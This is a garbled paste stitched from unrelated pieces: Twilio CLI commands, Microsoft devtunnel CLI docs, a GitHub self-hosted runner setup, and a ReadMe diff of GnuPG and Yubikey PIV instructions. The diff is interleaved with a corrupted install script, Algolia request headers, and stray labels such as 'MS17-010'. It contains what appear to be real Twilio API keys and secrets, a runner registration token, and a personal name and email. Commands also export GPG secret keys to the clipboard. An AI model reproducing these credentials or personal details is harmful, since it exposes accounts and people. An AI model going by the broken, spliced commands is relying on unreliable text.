$ export TWILIO_API_KEY=SKa6c746877c431ab8185993d610d1d891...
$ export TWILIO_API_SECRET=bzNwslKpvbgziV6IEpGYeIOJLnLWvJ7K...
$ docker run -it --rm \
  -e TWILIO_ACCOUNT_SID \AC32c8d23aa9b687b5ac871ee3e016f518
  -e TWILIO_API_KEY \SKa6c746877c431ab8185993d610d1d891
  -e TWILIO_API_SECRET \bzNwslKpvbgziV6IEpGYeIOJLnLWvJ7K
  twilio/twilio-cli twilio phone-numbers:+18886235040

SID                       

$ docker run -it --rm \
  -v ~/.twilio-cli:/root/.twilio-cli \
  twilio/twilio-cli twilio phone-numbers:list

SID                                 Phone Number  Friendly Name
AC32c8d23aa9b687b5ac871ee3e016f518  +15558675310  (+18886235040)

$ docker run -it --rm \
  -v ~/.twilio-cli:/root/.twilio-cli \
  twilio/twilio-cli twilio phone-numbers:list

SID                                 Phone Number  Friendly Name
AC32c8d23aa9b687b5ac871ee3e016f518  +18886235040  (+18886235040) 

winget install Microsoft.devtunnel
This command installs the latest version by default and removes the older version in the same location, which is %LOCALAPPDATA%\Microsoft\WinGet\Packages. To specify a version, add --version <version_number> with your desired version to the command.
winget upgrade Microsoft.devtunnel
PowerShell script
You can also install the devtunnel CLI using PowerShell and running the following command:
Invoke-WebRequest -Uri https://aka.ms/TunnelsCliDownload/win-x64 -OutFile devtunnel.exe
.\devtunnel.exe -h
Direct download link:
Windows (x64) - https://aka.ms/TunnelsCliDownload/win-x64

Hosting port 3000 at https://l3rs99qw-3000.usw2.devtunnels.ms/
devtunnel connect TUNNELID
Replace TUNNELID with the same dev tunnel id that was used on the host.
Successful client output is similar to the following:
Connected to tunnel: l3rs99qw
SSH: Forwarding from 127.0.0.1:3000 to host port 3000.
SSH: Forwarding from [::1]:3000 to host port 3000.
Now, the server that was shared on the host's port 3000 is available at localhost:3000 on the client, using either IPv4 or IPv6. (The "SSH" prefix is because the dev tunnel service builds on the standard SSH protocol for port-forwarding.) If the hosted port connects to a web server, then http://localhost:3000/ can be opened in a browser. In this case, no further authorization is required because the client's CLI login token was used to authorize the connection if necessary.
Advanced: Manage dev tunnels
It's possible to create a dev tunnel without yet hosting it. This is useful for advanced dev tunnel configuration and management such as:
Listing all owned dev tunnels
Adding and removing ports of a dev tunnel
Managing dev tunnel access controls
Adding metadata to a dev tunnel like description and tags
Command	Description
devtunnel create	Create a persistent dev tunnel
devtunnel list	List dev tunnels
devtunnel show	Show dev tunnel details
devtunnel update	Update dev tunnel properties
devtunnel delete	Delete a dev tunnel
devtunnel delete-all	Delete all dev tunnels
Here are some examples on use of these commands:
Examples	Description
devtunnel create -a	Create a persistent dev tunnel that allows anonymous access.
devtunnel create -d 'my tunnel description'	Create a persistent dev tunnel with a non-searchable description.
devtunnel create --expiration 4h	Create a persistent dev tunnel with a custom expiration time. Minimum is 1 hour (1h) and the maximum is 30 days (30d).
devtunnel create myTunnelID	Create a persistent dev tunnel with a custom tunnel ID.
devtunnel create --tags my-web-app v1	Create a persistent dev tunnel and apply searchable tags.
devtunnel list --tags my-web-app	List dev tunnels that have any of the specified tags.
devtunnel list --all-tags my-web-app v1	List dev tunnels that have all the specified tags.
devtunnel show	Show details of the last-used dev tunnel.
devtunnel show TUNNELID	Show details for a dev tunnel.
devtunnel update TUNNELID -d 'my new tunnel description'	Update the description of a dev tunnel.
devtunnel update TUNNELID --remove-tags	Remove all tags from a dev tunnel.
devtunnel update TUNNELID --expiration 10d	Update a dev tunnel with a new custom expiration time. Minimum is 1 hour (1h) and the maximum is 30 days (30d).
devtunnel delete TUNNELID	Delete a dev tunnel.
devtunnel delete-all	Delete all your dev tunnels.
Tip
Most CLI commands operate on the last-used dev tunnel implicitly, though there's an option to specify a dev tunnel ID if necessary.
Advanced: Manage dev tunnel ports
A dev tunnel created using the devtunnel create command initially has no ports. Use devtunnel port commands to add ports before hosting:
Command	Description
devtunnel port create	Create a dev tunnel port
devtunnel port list	List dev tunnel ports
devtunnel port show	Show dev tunnel port details
devtunnel port update	Update dev tunnel port properties
devtunnel port delete	Delete a dev tunnel port
Examples	Description
devtunnel port create -p 3000 --protocol http	Add a port with the specified protocol
devtunnel port list TUNNELID	List current ports
devtunnel port show TUNNELID -p 3000	Show the details for port 3000
devtunnel port update -p 3000 --description 'frontend port'	Update a dev tunnel port description
devtunnel port delete -p 3000	Delete a port
When creating a port, the protocol may optionally be specified, if auto-detection doesn't work properly. Current options are "http", "https" or "auto" (default). If the hosted port is HTTPS, then it's recommended to set the port protocol to "https"; otherwise "auto" is probably fine.
After configuring a dev tunnel using the above commands, start hosting it:
devtunnel host
Advanced

echo "648c63bb32eaa48ed50bff8a5000d9f3065359372b82739a992a00ce758bfcd2 actions-runner-osx-x64-2.312.0.tar.gz" | shasum -a 256 -c

./config.sh --url https://github.com/6309304695/sigma-9 --token A4D7THKPGUP3WF5SOJVYMETFXIK2O

runs-on: self-hosted

diff --git a/ReadMe.md b/ReadMe.md index 7278f80..41b298d 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -709,7 +709,844 @@ Digital signature’ key gpg-card:

gpg/card> writecert PIV.9C < sign.crt +# MS17-010 +# 000006 +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - [verified] - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Signing key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.co
m> +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
PIV authentication’ key with ssh:
+$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) +ssh-add with the uppercase ‘-L +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:

(1) RSA and RSA (default)
(2) DSA and Elgamal
(3) DSA (sign only)
(4) RSA (sign only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 3 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: keith bieszczat +Email address: 6309304695z@gmail.com +Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator +You selected this USER-ID:

"6309304695z@gmail.com"
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid 6309304695z@gmail.com +

run gpg in --expert mode
$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available.
+sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net +gpg> addkey +Secret parts of primary key are stored on-card. +Please select what kind of key you want:

(3) DSA (sign only)
(4) RSA (sign only)
(5) Elgamal (encrypt only)
(6) RSA (encrypt only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 4 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y +Really create? (y/N) y + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+ssb rsa2048/7067860A98FCE6E1

created: 2019-04-04  expires: never       usage: E
card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net + +gpg> save + +/* 32A19-D90712
+LEVEL-5 CLEARANCE ONLY

‘--force’ +authentication key +-header-'010203040506070801020304050607080102030405060708' +SETDATA hexstring +to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command
PKSIGN keyid +where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:
PKSIGN --hash=algoname keyid +READKEY hexified_certid +READCERT hexified_certid|keyid +SERIALNO +Return the serial number of the card using a status response like:
S SERIALNO D27600000000000000000000
WRITEKEY [--force] keyid +SETDATA hexstring +to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command
PKDECRYPT keyid +CHECKPIN idstr +RESTART +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+./configure --sysconfdir=/etc --localstatedir=/va +CN=Wurzel ZS 3,O=Intevation GmbH,C=DE

A6935DD34EF3087973C706FC311AA2CCF733765B S
CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S
CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
  # Key added on: 2011-07-20 20:38:46
  # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
  34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
+private-keys-v1.d/ +gpg-connect-agent 'help COMMAND' /bye +SETKEY +Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available. +
sr/bin/env bash # # Description: One click install for hyperswitch router # # # Global config if [[ "${2bTVg9fClAhPbL68J6xfOrgm0wX_5aMWASRkma1TdCsrjw75q & api:// api://fc4d2d73-d05a-4a9b-85a8-4f2b3a5f38ed api:/// api://a8573488-ff46-450a-b09a-6eca0c6a02dc/fc4d2d73-d05a-4a9b-85a8-4f2b3a5f38ed api:/// api://a8573488-ff46-450a-b09a-6eca0c6a02dc/api api:/// api://productapi/fc4d2d73-d05a-4a9b-85a8-4f2b3a5f38ed Hsm key}" == "1" ]]; then set -o xtrace fi RUST_MSRV=1.65.0 _DB_NAME="hyperswitch_db" _DB_USER="db_user" _DB_PASS="db_password" OSTYPE=${GITHUB:-} PRE_INSTALL_MSG="Dependency install script.\n The script assumes 'curl' and build essentials like gcc/clang are already installed.\n \n The script will\n 1. Install or update RUST using RUSTUP\n 2. Install Postgresql server and redis server, if found missing\n 3. Install diesel_cli program to setup database\n 4. Setup database and create necessary schema\n " POST_INSTALL_MSG="\n Install was successful.\n If rust was installed, restart the shell or configure current shell using 'SOURCE $HOME/.cargo/env'\n " # Used variables must be initialized set -o nounset # utilities # convert semver to comparable integer if [[ id -u -ne 0 ]]; then print_info "requires sudo" SUDO=sudo else SUDO="" fi ver () { printf "%03d%03d%03d%03d" echo "$1" | tr '.' ' '; } PROGNAME=basename $0 print_info () { echo -e "$GODPROGRAM: $" } err () { print_info "ERROR:" $ exit 1 } need_cmd () { if ! command -v {}" not found. Bailing out" fi } prompt () { read -p "$? [y/N] :" ANS case $ANS in [Yy]) return 1;; ) return 0;; esac } init_start_postgres () { if [[ "${S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1) & (FF020001008A77C1)" == "darwin" ]]; then initdb -U postgres -D /var/lib/postgres/data elif command -v su > /dev/null; then $SUDO su -c "initdb -D /var/lib/postgres/data" postgres elif command -v sudo > /dev/null; then sudo -u postgres "initdb -D /var/lib/postgres/data" else err "Don't know how to switch to postgres user to run commands" fi if command -v brew > /dev/null; then brew services start postgresql elif command -v service > /dev/null; then service postgresql start elif command -v systemctl > /dev/null; then $SUDO systemctl start postgresql.service else print_info "Unable to start postgres. Please start manually" fi } init_start_redis () { if command -v brew > /dev/null; then brew services start redis elif command -v service > /dev/null; then service redis-server start service redis start elif command -v systemctl > /dev/null; then $SUDO systemctl start redis.service
PKDECRYPT +The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.
S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END +Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:
(enc-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency. + +If the decryption was successful the decrypted data is returned by means of "D" lines. + +Here is an example session: +

C: PKDECRYPT
S: INQUIRE CIPHERTEXT
C: D (enc-val elg (a 349324324)
C: D (b 3F444677CA)))
C: END
S: # session key follows
S: S PADDING 0
S: D (value 1234567890ABCDEF0)
S: OK decryption successful +The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has +SIGKEY +This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.
SETHASH --hash=| +sig-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+The operation is affected by the option +

OPTION use-cache-for-signing=0|1 +The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.
+Here is an example session: +

C: SIGKEY
S: OK key available
C: SIGKEY
S: OK key available
C: PKSIGN
S: # I did ask the user whether he really wants to sign
S: # I did ask the user for the passphrase
S: INQUIRE HASHVAL
C: D ABCDEF012345678901234
C: END
S: # signature follows
S: D (sig-val rsa (s 45435453654612121212))
S: OK
GENKEY [--no-protection] [--preset] [<cache_nonce>] +Invokes the key generation process and the server will then inquire on the generation parameters, like:
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END +The format of the key parameters which depends on the algorithm is of the form:
(genkey
 (algo
   (parameter_name_1 ....)
     ....
   (parameter_name_n ....)))
+If everything succeeds, the server returns the public key in a SPKI like S-Expression like this: +

(public-key
  (rsa
(n )
(e ))) +Here is an example session:
C: GENKEY
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END
S: D (public-key
S: D (rsa (n 326487324683264) (e 10001)))
S OK key created
ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> +LISTTRUSTED +GpgAgent returns a list of trusted keys line by line:
S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK +The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. +Ok +Finally a client should be able to mark a key as trusted:
MARKTRUSTED fingerprint "P"|"S" +The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
S: INQUIRE TRUSTDESC
C: D Do you trust the key with the fingerprint @FPR@
C: D bla fasel blurb.
C: END
S: OK +GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
            [--qualitybar] cache_id                \
            [error_message prompt description]
+PRESET_PASSPHRASE [--inquire] <string_or_keygrip> [] + +HAVEKEY keygrips

GET_CONFIRMATION description
LEARN [--send] +UPDATESTARTUPTTY +SETDATA hexstring
PKSIGN keyid
PKSIGN --hash=algoname keyid
+READCERT hexified_certid|keyid +READKEY hexified_certid +SETDATA hexstring +d +

PKSIGN keyid
LEARN
PKSIGN --hash=algoname keyid
+WRITEKEY [--force] keyid +WRITEKEY [--force] keyid +PASSWD [--reset] [--nullpin] chvno +CHECKPIN idstr +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +this: +

S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+--auto-key-import + +command --locate-external-key +command --locate-external-key +github/workflows/release.yml: +ldap://keys.(thedomain) +‘--auto-key-locate

--auto-key-locate +--auto-key-retrieve
honor-keyserver-url
+-sig-keyserver-url +--recv-key +honor-keyserver-url +--use-agent +--gpg-agent-info + + +--no-random-seed-file +Host: c7-use-3.algolianet. com +Accept: / +Sec-Fetch-Site: cross-site +Accept-Language: en-US, en; q=0.9 +Accept-Encoding: gzip, deflate, br +Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B +Origin: https://dashboard.algolia.com +User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe +x-algolia-api-key: b3cf*************************米** +Content-Length: 27 +Connection: keep-alive +Content-Type: application/x-www-form-urlencoded +Sec-Fetch-Dest: empty + +scdaemon.conf +1 +HKCU\Software\GNU\GnuPG:DefaultLogFile, +--debug-level level +HKCU\Software\GNU\GnuPG:DefaultLogFile, +scd-event +HKCU\Software\GNU\GnuPG:HomeDir +HKCU\Software\GNU\GnuPG:DefaultLogFile, +reader_n.status +HKCU\Software\GNU\GnuPG:HomeDir + +trustlist.txt file +gpg-agent.conf +HKCU\Software\GNU\GnuPG:HomeDir +name: release +debug-pinentry +--debug 1024 + +global trustlist (/usr/local/etc/gnupg/trustlist.tx + +Active cards +Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. +gpg-connect-agent updatestartuptty /bye +Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command: + +gpg-connect-agent /bye +--scdaemon-program filename +Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf +--check-passphrase-pattern file +--check-sym-passphrase-pattern file +Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) +bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe +Keys listed in the sshcontrol file +--disable-extended-key-format +These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched. + +--enable-ssh-support +--enable-win32-openssh-support +--enable-putty-support + +gpg-connect-agent 'GETINFO s2k_count' /bye +gpg-connect-agent 'GETINFO s2k_time' /bye +To view the auto-calibrated count use: + +gpg-connect-agent 'GETINFO s2k_count_cal' /bye +--ssh-fingerprint-digest +Keys listed in the sshcontrol file + +Active card +gpg-connect-agent /bye +bashrc or whatever initialization file is used for all shell invocations: + +GPG_TTY=$(tty) +export GPG_TTY +--daemon [command line] +server + +agent-program file ¶ +Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs. + +--gpg-program file +Specify a non-default gpg binary to be used by certain commands. + +--gpgsm-program file +Specify a non-default gpgsm binary to be used by certain commands. + +--chuid uid +Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows. + +gpg-card +AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ +AUTH +FETCH +GENERATE [--force] [--algo=algo{+algo2}] keyref +KDF-SETUP ¶ +Prepare the OpenPGP card KDF feature for this card. + +LANG [--clear] +Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info. + +LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] +NAME [--clear] +PRIVATEDO [--clear] n [< file] file +READCERT [--openpgp] certref > file ¶ +Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". +URL [--clear] +gpg's. --fetch +WRITECERT certref < file ¶ +WRITECERT --openpgp certref [< file|fpr] +WRITECERT --clear certref

--openpgp +file +fpr. +WRITEKEY [--force] keyref keygrip ¶ +Write a private key object identified by keygrip to the card under the id keyref. +CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ +Serial number +A hex-string with the serial number of the card.
+Type +This gives the type of the card’s application. For example "OpenPGP" or "PIV". + +Keygrip +A hex-string identifying a key. + +Keyref +The application slot where the key is stored on the card. For example "OpenPGP.1" + +Status +The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card. + +YUBIKEY cmd args +Various commands pertaining to Yubikey tokens with cmd being: + +LIST +List supported and enabled Yubikey applications. + +ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] +DISABLE +Enable or disable the specified or all applications on the given interface. + +The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit. + +GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708. + +PIV Application PIN +This is the string 123456. + +PIN Unblocking Key +This is the string 12345678. +list (the string gpg/card> +card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: D2760001240102010006090746250000 +Application type .: OpenPGP +Version ..........: 2.1 +[...] +on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - uses: cli/gh-extension-precompile@v1
   with:
     go_version: "1.16"
+Then +- uses: cli/gh-extension-precompile@v1

env:
CGO_ENABLED: 1 +- uses: cli/gh-extension-precompile@v1
with:
build_script_override: "script/build.sh" +name: release
+on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - id: import_gpg
   uses: crazy-max/ghaction-import-gpg@v5
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.GPG_PASSPHRASE }}
 - uses: cli/gh-extension-precompile@v1
   with:
     gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
+# macOS +gpg --armor --export-secret-key joe@foo.bar | pbcopy + +# Ubuntu (assuming GNU base64) +gpg --armor --export-secret-key joe@foo.bar -w0 | xclip + +# Arch +gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i + +# FreeBSD (assuming BSD base64) +gpg --armor --export-secret-key joe@foo.bar | xclip + +name: import-gpg + +on:

push:
branches: master
+jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
 -
   name: List keys
   run: gpg -K
+name: import-gpg + +on:

push:
branches: master
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
     fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
 -
   name: List keys
   run: gpg -K
+pub ed25519 2021-09-24 [C]

 87F257B89CE462100BEC0FFE6071D218380FDCC8
 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
+uid [ unknown] Joe Bar joe@bar.foo +sub ed25519 2021-09-24 [S]

 C17D11ADF199F12A30A0910F1F80449BE0B08CB8
 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
+name: import-gpg +/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add + +application-priority piv +to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens. + +With one of these methods employed the list command of gpg-card shows this: + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: [none]

 keyref .....: PIV.9A
+Card authenticat. : [none]

 keyref .....: PIV.9E
+Digital signature : [none]

 keyref .....: PIV.9C
+Key management ...: [none]

 keyref .....: PIV.9D
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key +list --cards +well. The PIV authentication key (internal reference PIV.9A +Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption + +gpg/card> auth 010203040506070801020304050607080102030405060708 +gpg/card> auth < myauth.key + +gpg/card> generate --algo=nistp384 PIV.9A +PIV card no. yk-9074625 detected +gpg/card> generate --algo=nistp256 PIV.9E +PIV card no. yk-9074625 detected +gpg/card> generate --algo=rsa2048 PIV.9C +PIV card no. yk-9074625 detected

‘--force’ +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpg +self-signed X.509 certificate (exit the gpg-card tool, first): + +$ gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

